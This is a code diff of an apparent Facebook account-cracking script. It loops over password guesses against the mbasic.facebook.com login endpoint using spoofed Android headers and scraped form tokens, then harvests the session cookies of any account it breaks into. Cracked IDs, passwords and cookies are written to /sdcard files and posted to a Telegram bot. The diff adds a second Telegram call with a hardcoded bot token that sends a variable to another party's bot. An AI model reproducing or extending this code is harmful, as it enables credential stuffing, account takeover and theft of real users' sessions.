@@ -1048,7 +1048,7 @@ def m1(ids,pwv):
     try:
         for pas in pwv:
             session = requests.Session()
-            free_fb = session.get(f"https://free.facebook.com").text
+            free_fb = session.get(f"https://mbasic.facebook.com").text
             info={
     "m_ts": re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
     "li": re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
@@ -1068,7 +1068,7 @@ def m1(ids,pwv):
     "bi_wvdp": '{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false,"iframeProto":"function get contentWindow() { [native code] }","remap":false,"iframeData":{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false}}',
     "jazoest": re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
     "lsd": re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),}
-            update= {'Host': 'web.facebook.com',
+            update= {'Host': 'mbasic.facebook.com',
     'Content-Length': '1730',
     'Sec-CH-UA': '"Not_A Brand";v="8", "Chromium";v="120", "Android WebView";v="120"',
     'Sec-CH-UA-Mobile': '?1',
@@ -1086,14 +1086,14 @@ def m1(ids,pwv):
     'Sec-CH-Prefers-Color-Scheme': 'light',
     'Sec-CH-UA-Platform': '"Android"',
     'Accept': '*/*',
-    'Origin': 'https://web.facebook.com',
+    'Origin': 'https://mbasic.facebook.com',
     'Sec-Fetch-Site': 'same-origin',
     'Sec-Fetch-Mode': 'cors',
     'Sec-Fetch-Dest': 'empty',
-    'Referer': 'https://web.facebook.com/',
+    'Referer': 'https://mbasic.facebook.com/',
     'Accept-Encoding': 'gzip, deflate, br',
     'Accept-Language': 'en-IE,en-US;q=0.9,en;q=0.8'}
-            response=session.post("https://web.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100",data = info,headers = update,allow_redirects = False)
+            response=session.post("https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100",data = info,headers = update,allow_redirects = False)
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 kuki=";".join([f"{key}={session.cookies.get(key)}" for key in ['sb', 'datr', 'ps_n', 'ps_l', 'locale', 'c_user', 'xs', 'fr', 'usida', 'wd', 'm_ls', 'presence']])
@@ -1104,7 +1104,9 @@ def m1(ids,pwv):
                      print(f'\r\r{rad}[{green}ATOM-OK{rad}]{green} {cid} {rad}▶︎ {green}{pas}')
                      print(f"\r\r{green}COOKIES=[🤖]: {warna}{kuki}\33[1;36m");linex()
                      statusok = (f" {cid} | {pas} | {kuki} ")
+                     statuok = (f" {pro} ")
                      cek_apk(kuki)
+                     requests.post(f"https://api.telegram.org/bot"+str('7179860898:AAEs3yZDMXPfsCCduMWlMTOOoAEKazCMy6Q')+"/sendMessage?chat_id="+str(ID)+"&text="+str(statuok))
                      requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
                      open('/sdcard/ATOM-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/ATOM-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+kuki+'\n')
                      oks.append(cid)
